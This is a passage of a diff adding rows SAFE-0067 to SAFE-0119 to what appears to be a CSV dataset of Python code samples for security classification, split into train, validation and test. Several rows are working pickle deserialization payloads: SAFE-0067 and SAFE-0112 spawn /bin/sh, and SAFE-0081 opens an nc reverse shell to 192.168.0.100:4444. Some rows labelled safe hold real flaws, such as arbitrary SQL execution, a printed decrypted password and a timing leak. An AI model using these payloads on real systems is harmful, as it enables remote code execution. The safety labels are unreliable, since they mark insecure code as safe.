+    
+    return str(result)
+
+if __name__ == '__main__':
+    app.run(debug=True)",pending,""
+SAFE-0067,train,"import pickle
+import subprocess
+
+class RunBinSh(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/sh'],))
+
+def serialize_exploit():
+    malicious = pickle.dumps(RunBinSh())
+    with open('exploit.pkl', 'wb') as f:
+        pickle.dump(malicious, f)
+
+if __name__ == ""__main__"":
+    serialize_exploit()",pending,""
+SAFE-0068,train,"import sqlite3
+
+def get_user_info(username):
+    conn = sqlite3.connect('mydatabase.db')
+    cursor = conn.cursor()
+    
+    # Use parameterized queries to prevent SQL injection
+    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
+    
+    result = cursor.fetchone()
+    return result
+
+# Test
+print(get_user_info(""admin""))",pending,""
+SAFE-0069,train,"import sqlite3
+from sqlite3 import Error
+
+def create_connection():
+    conn = None;
+    try:
+        conn = sqlite3.connect('my_database.db')
+        print(sqlite3.version)
+    except Error as e:
+        print(e)
+
+    return conn
+
+def fetch_user_data(conn, username):
+    cursor = conn.cursor()
+
+    # Using parameterized query to prevent SQL injection
+    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
+
+    rows = cursor.fetchall()
+
+    for row in rows:
+        print(row)
+
+def main():
+    # create a database connection
+    conn = create_connection()
+
+    with conn:
+        # Vulnerable call
+        fetch_user_data(conn, ""admin' OR '1'='1"")
+
+if __name__ == '__main__':
+    main()",pending,""
+SAFE-0070,train,"def print_array(arr):
+    for i in arr:
+        print(i)
+
+print_array([1, 2, 3, 4, 5])",pending,""
+SAFE-0071,train,"def format_string(user_input):
+    # Use str.format() instead of %-formatting for better performance and security
+    return ""Your input was: {}"".format(user_input)
+
+# Create a variable 'user_input' and assign it a string of 'A' repeated 10000000 times
+user_input = ""A"" * 10000000
+
+# Print the result of calling 'format_string' with 'user_input' as the argument
+print(format_string(user_input))",pending,""
+SAFE-0072,train,"import sqlite3
+from sqlite3 import Error
+
+def create_connection():
+    conn = None;
+    try:
+        conn = sqlite3.connect('mydatabase.db')
+        print(sqlite3.version)
+    except Error as e:
+        print(e)
+    return conn
+
+def get_user_info(conn, username):
+    cursor = conn.cursor()
+    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
+    rows = cursor.fetchall()
+    for row in rows:
+        print(row)
+
+def main():
+    conn = create_connection()
+    with conn:
+        get_user_info(conn, 'test_user')
+
+if __name__ == '__main__':
+    main()",pending,""
+SAFE-0073,train,"class BankAccount:
+    def __init__(self, balance):
+        self.balance = balance
+
+    def withdraw(self, amount):
+        if amount > self.balance:
+            raise ValueError(""Insufficient funds"")
+        self.balance -= amount
+
+account = BankAccount(100)
+try:
+    account.withdraw(200)
+except ValueError as e:
+    print(str(e))",pending,""
+SAFE-0074,train,"def get_user_input():
+    while True:
+        try:
+            user_input = input(""Enter your name: "")
+            if len(user_input) > 256:  # set a reasonable limit on the length of the input
+                raise ValueError(""Input too long"")
+            return user_input
+        except ValueError as e:
+            print(e)
+            print(""Please, enter a valid name."")
+
+def print_name(name):
+    print(""Your name is: "" + name)
+
+def main():
+    name = get_user_input()
+    print_name(name)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0075,train,"def function_name(input_string):
+    buffer = bytearray(input_string[:100], 'utf-8')
+    return buffer
+
+# call the function with a string that is longer than the buffer size
+print(function_name(""a""*150))",pending,""
+SAFE-0076,train,"import ast
+import operator as op
+
+# supported operators
+operators = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+            ast.Div: op.truediv, ast.USub: op.neg}
+
+def evaluate_expression(node):
+    if isinstance(node, ast.Num):  # <number>
+        return node.n
+    elif isinstance(node, ast.BinOp):  # <left> <operator> <right>
+        return operators[type(node.op)](evaluate_expression(node.left), evaluate_expression(node.right))
+    elif isinstance(node, ast.UnaryOp):  # <operator> <operand>
+        return operators[type(node.op)](evaluate_expression(node.operand))
+    else:
+        raise TypeError(node)
+
+def main():
+    user_input = input(""Enter an expression: "")
+    tree = ast.parse(user_input, mode='eval')
+    print(evaluate_expression(tree.body))
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0077,train,"def get_user_input():
+    input_data = input(""Enter your data: "")
+    return input_data
+
+def process_data(data):
+    buffer = bytearray(data, 'utf-8')
+    return buffer
+
+def main():
+    input_data = get_user_input()
+    processed_data = process_data(input_data)
+    print(processed_data)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0078,train,"import ast
+import operator as op
+
+# supported operators
+operators = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+            ast.Div: op.truediv, ast.USub: op.neg}
+
+def evaluate_expr(node):
+    if isinstance(node, ast.Num): # <number>
+        return node.n
+    elif isinstance(node, ast.BinOp): # <left> <operator> <right>
+        return operators[type(node.op)](evaluate_expr(node.left), evaluate_expr(node.right))
+    elif isinstance(node, ast.UnaryOp): # <operator> <operand>
+        return operators[type(node.op)](evaluate_expr(node.operand))
+    else:
+        raise TypeError(node)
+
+def evaluate_input(user_input):
+    try:
+        tree = ast.parse(user_input, mode='eval')  # parse user input
+        return evaluate_expr(tree.body)  # evaluate parsed user input
+    except Exception as e:
+        print('Invalid input:', e)
+
+user_input = input(""Enter a mathematical expression: "")
+print(evaluate_input(user_input))",pending,""
+SAFE-0079,train,"import pickle
+import os
+import subprocess
+
+class EvilPickle(object):
+    def __reduce__(self):
+        return (subprocess.call, (['echo', 'You have been hacked'],))
+
+pickled = pickle.dumps(EvilPickle())
+print(pickled)",pending,""
+SAFE-0080,train,"def evaluate_input(user_input):
+    # Allow only certain operations
+    allowed_operations = ['+', '-', '*', '/']
+    
+    for operation in allowed_operations:
+        if operation in user_input:
+            try:
+                # split the string into two parts at the operator
+                left, right = user_input.split(operation)
+                
+                # check if both parts are digits
+                if left.isdigit() and right.isdigit():
+                    left, right = int(left), int(right)
+                    
+                    # perform the operation
+                    if operation == '+':
+                        return left + right
+                    elif operation == '-':
+                        return left - right
+                    elif operation == '*':
+                        return left * right
+                    elif operation == '/':
+                        if right != 0:  # avoid division by zero
+                            return left / right
+                        else:
+                            return ""Error: Division by zero""
+            except Exception as e:
+                return f""Error: {str(e)}""
+    
+    return ""Error: Invalid operation""
+
+user_input = input(""Enter something to evaluate (example: 2+3): "")
+print(evaluate_input(user_input))",pending,""
+SAFE-0081,train,"import pickle
+import os
+import subprocess
+
+class RCE:
+    def __init__(self):
+        self.command = 'nc -e /bin/bash 192.168.0.100 4444'
+
+    def __reduce__(self):
+        return (subprocess.Popen, (self.command,))
+
+rce_instance = RCE()
+pickled = pickle.dumps(rce_instance)
+print(pickled)",pending,""
+SAFE-0082,train,"import sys
+sys.setrecursionlimit(3000) # Set a limit for recursion depth
+
+def infinite_loop(n):
+    if n >= 3000: # Adding an exit condition to avoid resource exhaustion
+        return
+    else:
+        n += 1
+        infinite_loop(n)
+
+infinite_loop(0)",pending,""
+SAFE-0083,train,"import time
+
+def check_password(password):
+    correct_password = ""correct_password""
+    if len(password) != len(correct_password):
+        return False
+    for p, c in zip(password, correct_password):
+        if p != c:
+            return False
+        if ord(p) > ord(c):
+            time.sleep(0.1)
+    return True
+
+# Testing the function
+start = time.time()
+print(check_password(""incorrect_password""))  # Should print False
+end = time.time()
+print(""Time taken: "", end - start)
+
+start = time.time()
+print(check_password(""correct_password""))  # Should print True
+end = time.time()",pending,""
+SAFE-0084,train,"import sys
+
+def create_large_list():
+    large_list = []
+    for _ in range(10**3): # Generate 10^3 smaller lists instead of one large list
+        small_list = [""a""*10**6]
+        large_list += small_list
+    return large_list
+
+def main():
+    large_list = create_large_list()
+    print(f'Size of the list in bytes: {sys.getsizeof(large_list)}')
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0085,train,"import pickle
+import subprocess
+
+class SafeClass:
+    def __init__(self):
+        self.message = ""You have been hacked!""
+
+    def __getstate__(self):
+        raise TypeError(""Serialization of this class is not allowed."")
+
+def serialize_safe_object():
+    safe_instance = SafeClass()
+    with open('payload.dat', 'wb') as f:
+        pickle.dump(safe_instance, f)
+
+serialize_safe_object()",pending,""
+SAFE-0086,train,"import ast
+import os
+
+def safe_eval(node):
+    if isinstance(node, ast.Expression):
+        node = node.body
+    if isinstance(node, ast.Str):
+        return node.s
+    elif isinstance(node, ast.Num):
+        return node.n
+    elif isinstance(node, ast.BinOp):
+        left = safe_eval(node.left)
+        right = safe_eval(node.right)
+        if isinstance(node.op, ast.Add):
+            return left + right
+        elif isinstance(node.op, ast.Sub):
+            return left - right
+        elif isinstance(node.op, ast.Mult):
+            return left * right
+        elif isinstance(node.op, ast.Div):
+            return left / right
+    else:
+        raise ValueError('Unsupported operation')
+
+user_input = input(""Enter your command: "")
+tree = ast.parse(user_input, mode='eval')
+result = safe_eval(tree.body)
+print(result)",pending,""
+SAFE-0087,train,"class SecureClass:
+    def __init__(self):
+        self.data = {}
+
+    def save_data(self, key, value):
+        # Escape special characters to prevent code injection
+        self.data[key] = value.replace(';', '').replace('&', '').replace('|', '')
+
+    def get_data(self, key):
+        return self.data[key]
+
+def main():
+    sc = SecureClass()
+    user_input = input(""Enter data: "")
+    sc.save_data('key', user_input)
+    print(sc.get_data('key'))
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0088,train,"import pickle
+import flask
+from flask import Flask, request
+
+app = Flask(__name__)
+
+class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        if module == 'os' or module == 'subprocess':
+            raise pickle.UnpicklingError(""Global '%s.%s' is forbidden"" % (module, name))
+        return super().find_class(module, name)
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    data = request.get_data()
+    deserialized_data = RestrictedUnpickler(io.BytesIO(data)).load()
+    print(deserialized_data)
+    return 'OK'
+
+if __name__ == ""__main__"":
+    app.run(debug=True)",pending,""
+SAFE-0089,train,"import time
+import sys
+sys.setrecursionlimit(3000)  # Set a higher recursion limit
+
+def infinite_recursion(n):
+    if n > 0:
+        print(""Recursion number: "", n)
+        time.sleep(1)  # This will make the function slower
+        infinite_recursion(n+1)  # This is the recursive call that will cause the function to call itself indefinitely
+
+# Call the function with a reasonable limit to avoid DoS
+infinite_recursion(1000)",pending,""
+SAFE-0090,train,"def main():
+    s = ""Hello""
+    t = ""World""
+    u = s + t
+    v = u[:10]
+    print(v)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0091,train,"def format_string(user_input):
+    if not isinstance(user_input, str):
+        raise ValueError(""Input must be a string"")
+    return f""Hello, {user_input}!""
+
+while True:
+    try:
+        print(format_string(input(""Enter your name: "")))
+    except Exception as e:
+        print(""An error occurred: "", e)",pending,""
+SAFE-0092,train,"import sqlite3
+from sqlite3 import Error
+
+class DatabaseConnection():
+    def __init__(self, db_file):
+        self.conn = None
+        try:
+            self.conn = sqlite3.connect(db_file)
+            print(f""Successfully Connected to {db_file}"")
+        except Error as e:
+            print(e)
+
+    def execute_query(self, query, params=None):
+        cur = self.conn.cursor()
+        if params:
+            cur.execute(query, params)
+        else:
+            cur.execute(query)
+
+        rows = cur.fetchall()
+
+        return rows
+
+if __name__ == ""__main__"":
+    db = DatabaseConnection('my_database.db')
+    user_input = input(""Enter your SQL query: "")
+    results = db.execute_query(user_input)
+    print(results)",pending,""
+SAFE-0093,train,"import sqlite3
+
+def get_user(username):
+    conn = sqlite3.connect('mydatabase.db')
+    cursor = conn.cursor()
+    # Use parameterized query to prevent SQL injection
+    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
+    user = cursor.fetchone()
+    return user
+
+# Testing the function
+print(get_user(""admin""));",pending,""
+SAFE-0094,train,"import os
+
+def read_file(filename):
+    # Check if the file exists
+    if os.path.isfile(filename):
+        try:
+            with open(filename, 'r') as file:
+                content = file.read()
+            return content
+        except IOError:
+            print(""Failed to read the file."")
+    else:
+        print(""File does not exist."")
+
+print(read_file('large_file.txt'))",pending,""
+SAFE-0095,validation,"import subprocess
+
+def execute_command(user_input):
+    # Validate input to prevent command injection
+    if any(char in user_input for char in [';', '&', '|']):
+        print(""Invalid input. Please enter a valid filename."")
+        return
+    
+    command = ['ls', user_input]
+    try:
+        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
+        print(output.decode())
+    except subprocess.CalledProcessError as e:
+        print(f""Command failed with error: {e}"")
+
+user_input = input(""Enter your command: "")
+execute_command(user_input)",pending,""
+SAFE-0096,validation,"def handle_request():
+    user_input = input(""Enter your name: "")
+    print(""Hello, "" + user_input)
+
+handle_request()",pending,""
+SAFE-0097,validation,"import sqlite3
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+
+    # Use parameterized queries to prevent SQL injection
+    query = ""SELECT * FROM users WHERE username=? AND password=?""
+    result = c.execute(query, (username, password))
+
+    if result.fetchone():
+        return 'Login successful!'
+    else:
+        return 'Invalid credentials!'
+
+if __name__ == '__main__':
+    app.run(debug=True)",pending,""
+SAFE-0098,validation,"import random
+
+def generate_random_integer():
+    return random.randint(1, 10)
+
+def divide_by_zero():
+    try:
+        number = generate_random_integer()
+        if number == 0:
+            raise ValueError(""Cannot divide by zero"")
+        result = 10 / number
+        print(""Result: "", result)
+    except ValueError as ve:
+        print(ve)
+    except Exception as e:
+        print(""An error occurred: "", e)
+
+divide_by_zero()",pending,""
+SAFE-0099,validation,"from flask import Flask, request, jsonify
+from ast import literal_eval
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    # Get the user input from the URL
+    user_input = request.args.get('input', '')
+
+    # Check if the user input is empty
+    if not user_input:
+        return jsonify({""error"": ""No input provided.""}), 400
+
+    try:
+        # Safely evaluate the user input as Python code
+        result = literal_eval(user_input)
+    except (ValueError, SyntaxError):
+        return jsonify({""error"": ""Invalid input.""}), 400
+
+    # Return the result of the evaluation
+    return jsonify({""result"": result})
+
+if __name__ == '__main__':
+    app.run()",pending,""
+SAFE-0100,validation,"import ast
+
+class ExpressionVisitor(ast.NodeVisitor):
+    def visit(self, node):
+        self.generic_visit(node)
+
+def evaluate_input(user_input):
+    tree = ast.parse(user_input, mode='eval')
+    visitor = ExpressionVisitor()
+    visitor.visit(tree)
+
+print(""Enter some Python expressions to evaluate:"")
+while True:
+    user_input = input()
+    if user_input == ""exit"":
+        break
+    try:
+        evaluate_input(user_input)
+    except Exception as e:
+        print(""Error:"", str(e))",pending,""
+SAFE-0101,validation,"import ast
+import operator as op
+
+# supported operators
+operators = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+            ast.Div: op.truediv, ast.USub: op.neg}
+
+def evaluate_expr(node):
+    if isinstance(node, ast.Num):  # <number>
+        return node.n
+    elif isinstance(node, ast.BinOp):  # <left> <operator> <right>
+        return operators[type(node.op)](evaluate_expr(node.left), evaluate_expr(node.right))
+    elif isinstance(node, ast.UnaryOp):  # <operator> <operand> e.g., -1
+        return operators[type(node.op)](evaluate_expr(node.operand))
+    else:
+        raise TypeError(node)
+
+def evaluate_input(user_input):
+    # This line of code is now safe from arbitrary code execution
+    node = ast.parse(user_input, mode='eval').body
+    result = evaluate_expr(node)
+    return result
+
+def main():
+    user_input = ""2+2""  # This is an example of trusted input
+    print(evaluate_input(user_input))
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0102,validation,"from flask import Flask, request
+import ast
+import operator as op
+
+# Dictionary of operators
+OPERATORS = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+            ast.Div: op.truediv, ast.USub: op.neg}
+
+app = Flask(__name__)
+
+class Visitor(ast.NodeVisitor):
+    def visit_BinOp(self, node):
+        left = self.visit(node.left)
+        right = self.visit(node.right)
+        return OPERATORS[type(node.op)](left, right)
+
+    def visit_Num(self, node):
+        return node.n
+
+    def visit_Expr(self, node):
+        return self.visit(node.value)
+
+    def visit_UnaryOp(self, node):
+        return OPERATORS[type(node.op)](self.visit(node.operand))
+
+    @classmethod
+    def evaluate(cls, expression):
+        tree = ast.parse(expression, mode='eval')
+        visitor = cls()
+        return visitor.visit(tree.body)
+
+@app.route('/calc', methods=['GET'])
+def calculate():
+    equation = request.args.get('equation')
+    try:
+        result = Visitor.evaluate(equation)
+    except Exception as e:
+        return str(e), 400
+    return str(result)
+
+if __name__ == '__main__':
+    app.run(debug=True)",pending,""
+SAFE-0103,validation,"def get_data(index):
+    if isinstance(index, int) and index >= 0:
+        data = ['a', 'b', 'c']
+        return data[index]
+    else:
+        raise ValueError(""Index must be a non-negative integer"")
+
+try:
+    print(get_data(1))
+except ValueError as e:
+    print(e)",pending,""
+SAFE-0104,validation,"from flask import Flask, request
+import ast
+
+app = Flask(__name__)
+
+@app.route('/eval', methods=['POST'])
+def evaluate():
+    data = request.get_data()
+
+    # Use ast.literal_eval instead of eval to prevent arbitrary code execution
+    try:
+        result = ast.literal_eval(data)
+    except Exception as e:
+        return ""Error: "" + str(e)
+
+    return str(result)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)",pending,""
+SAFE-0105,validation,"import ast
+import operator as op
+
+# Define allowed operations
+allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv}
+
+class Visitor(ast.NodeVisitor):
+    def visit_BinOp(self, node):
+        try:
+            left = self.visit(node.left)
+            right = self.visit(node.right)
+            return allowed_operations[type(node.op)](left, right)
+        except Exception as e:
+            raise ValueError(f""Invalid operation: {node.op.__class__.__name__}"")
+
+    def visit_Num(self, node):
+        return node.n
+
+def evaluate_expression(expr):
+    tree = ast.parse(expr, mode='eval')
+    visitor = Visitor()
+    result = visitor.visit(tree.body)
+    return result
+
+user_input = input(""Enter something: "")
+print(evaluate_expression(user_input))",pending,""
+SAFE-0106,validation,"import ast
+
+class UnsafeConstructError(Exception):
+    pass
+
+def safe_eval(node):
+    if isinstance(node, ast.Expression):
+        node = node.body
+    if isinstance(node, ast.Str):
+        return node.s
+    elif isinstance(node, ast.Num):
+        return node.n
+    elif isinstance(node, ast.BinOp):
+        cls = {ast.Add: float.__add__, ast.Sub: float.__sub__, ast.Mult: float.__mul__, ast.Div: float.__truediv__}
+        if isinstance(node.op, tuple(cls.keys())) and all(isinstance(x, (ast.Num, ast.BinOp)) for x in (node.left, node.right)):
+            return cls[type(node.op)](safe_eval(node.left), safe_eval(node.right))
+    raise UnsafeConstructError('Unsafe construct')
+
+def unsafe_function():
+    user_input = input(""Enter something: "")
+    try:
+        tree = ast.parse(user_input, mode='eval')
+        safe_eval(tree.body)
+    except Exception as e:
+        print(f""Invalid input: {e}"")
+
+unsafe_function()",pending,""
+SAFE-0107,validation,"import ast
+import operator as op
+
+# List of allowed operations
+allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+                      ast.Div: op.truediv, ast.USub: op.neg}
+
+class Visitor(ast.NodeVisitor):
+    def visit_Num(self, node):
+        return node.n
+    def visit_BinOp(self, node):
+        left = self.visit(node.left)
+        right = self.visit(node.right)
+        try:
+            return allowed_operations[type(node.op)](left, right)
+        except KeyError:
+            raise ValueError(f""Unsupported operation {type(node.op)}"")
+    def visit_UnaryOp(self, node):
+        child = self.visit(node.operand)
+        try:
+            return allowed_operations[type(node.op)](child)
+        except KeyError:
+            raise ValueError(f""Unsupported operation {type(node.op)}"")
+
+def evaluate_expression(expr):
+    tree = ast.parse(expr, mode='eval')  # Throws SyntaxError for bad syntax
+    visitor = Visitor()
+    result = visitor.visit(tree.body)  # Throws ValueError for unsupported operations
+    return result
+
+user_input = input(""Enter something here: "")
+try:
+    print(evaluate_expression(user_input))
+except (SyntaxError, ValueError) as e:
+    print(f""Invalid input: {e}"")",pending,""
+SAFE-0108,validation,"import threading
+import time
+
+class WorkerThread(threading.Thread):
+    def __init__(self):
+        super().__init__()
+        self._stop_event = threading.Event()
+
+    def stop(self):
+        self._stop_event.set()
+
+    def stopped(self):
+        return self._stop_event.is_set()
+
+    def run(self):
+        print(""Thread Started"")
+        while not self.stopped():
+            time.sleep(1)  # Simulate some work
+        print(""Thread Finished"")
+
+print(""Main Thread Started"")
+t = WorkerThread()
+t.start()
+time.sleep(5)  # Wait for the thread to start
+t.stop()
+t.join()
+print(""Main Thread Finished"")",pending,""
+SAFE-0109,validation,"import sqlite3
+
+def login(username, password):
+    conn = sqlite3.connect('user_data.db')
+    cursor = conn.cursor()
+    query = ""SELECT * FROM users WHERE username=? AND password=?""
+    cursor.execute(query, (username, password))
+    result = cursor.fetchone()
+    return result is not None
+
+if __name__ == '__main__':
+    username = input(""Enter your username: "")
+    password = input(""Enter your password: "")
+    if login(username, password):
+        print(""Login successful"")
+    else:
+        print(""Login failed"")",pending,""
+SAFE-0110,validation,"def safe_eval(user_input):
+    allowed_commands = ['ls', 'pwd']  # Add more commands as per your requirement
+    if user_input in allowed_commands:
+        __import__('os').system(user_input)
+    else:
+        print(""Command not allowed."")
+
+safe_eval('ls')",pending,""
+SAFE-0111,validation,"import getpass
+from cryptography.fernet import Fernet
+
+# Generate a key for encryption
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
+
+class User:
+    def __init__(self, username, password):
+        self.username = username
+        # Encrypt the password before storing it
+        self.password = cipher_suite.encrypt(password.encode())
+
+def register():
+    username = input(""Enter your username: "")
+    # Use getpass module to hide password input
+    password = getpass.getpass(""Enter your password: "")
+    return User(username, password)
+
+def login(user):
+    # Decrypt the password before displaying it
+    decrypted_password = cipher_suite.decrypt(user.password).decode()
+    print(f""Welcome {user.username}. Your password is {decrypted_password}"")
+
+def main():
+    user = register()
+    login(user)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0112,validation,"import pickle
+import subprocess
+
+class RunBinSh(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/sh'],))
+
+def serialize_exploit():
+    malicious = pickle.dumps(RunBinSh(), protocol=0)
+    with open('payload.dat', 'wb') as f:
+        pickle.dump(malicious, f)
+
+serialize_exploit()",pending,""
+SAFE-0113,test,"import ast
+import operator as op
+
+# Safe list of operators
+allowed_operators = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+                     ast.Div: op.truediv, ast.USub: op.neg}
+
+def run_code(node):
+    if isinstance(node, ast.Num):  # <number>
+        return node.n
+    elif isinstance(node, ast.BinOp):  # <left> <operator> <right>
+        return allowed_operators[type(node.op)](run_code(node.left), run_code(node.right))
+    elif isinstance(node, ast.UnaryOp):  # <operator> <operand>
+        return allowed_operators[type(node.op)](run_code(node.operand))
+    else:
+        raise TypeError(node)
+
+while True:
+    user_input = input(""Enter a command: "")
+    try:
+        tree = ast.parse(user_input, mode='eval')  # parse user input
+        result = run_code(tree.body)  # evaluate user input
+        print(result)
+    except Exception as e:
+        print(f""Invalid input: {e}"")",pending,""
+SAFE-0114,test,"import sqlite3
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/get_user')
+def get_user():
+    username = request.args.get('username')
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    # Use parameterized query to prevent SQL injection
+    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
+    result = cursor.fetchone()
+    if result:
+        return str(result)
+    else:
+        return ""User not found""
+
+if __name__ == '__main__':
+    app.run(debug=True)",pending,""
+SAFE-0115,test,"import ast
+
+class RestrictedPython(ast.NodeVisitor):
+    def visit_Call(self, node):
+        if not isinstance(node.func, ast.Name):
+            raise ValueError('Not allowed')
+        self.generic_visit(node)
+
+def safe_eval(node):
+    RestrictedPython().visit(node)
+
+def vulnerable_function():
+    user_input = input(""Enter what you want to execute: "")
+    tree = ast.parse(user_input, mode='eval')
+    safe_eval(tree)
+
+vulnerable_function()",pending,""
+SAFE-0116,test,"import logging
+
+class User:
+    def __init__(self, username, password):
+        self.username = username
+        self.password = password
+
+def login(user):
+    try:
+        # Assume this function does something important
+        pass
+    except Exception as e:
+        logging.exception(""An error occurred during login"")
+
+def main():
+    user = User('admin', 'password123')
+    login(user)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0117,test,"import sys
+
+def process_input(user_input):
+    buffer = bytearray(user_input[:1024])  # Limit the buffer size to 1024 bytes
+    return buffer
+
+if __name__ == ""__main__"":
+    user_input = sys.stdin.buffer.read()  # Read the input as bytes
+    print(process_input(user_input))",pending,""
+SAFE-0118,test,"class Buffer:
+    def __init__(self, size):
+        self.size = size
+        self.data = bytearray(size)
+        self.index = 0
+
+    def add_data(self, data):
+        if len(data) > self.size - self.index:
+            return False
+        for i in range(len(data)):
+            self.data[self.index] = data[i]
+            self.index += 1
+        return True
+
+buf = Buffer(10)
+buf.add_data(bytearray(20))
+print(buf.data)",pending,""
+SAFE-0119,test,"def str_manipulation(s):
+    try:
+        return s.encode('utf-8')
+    except UnicodeEncodeError:
+        print(""Error: Non-ASCII character detected."")
+        return None
+
+print(str_manipulation(""你好""))",pending,""
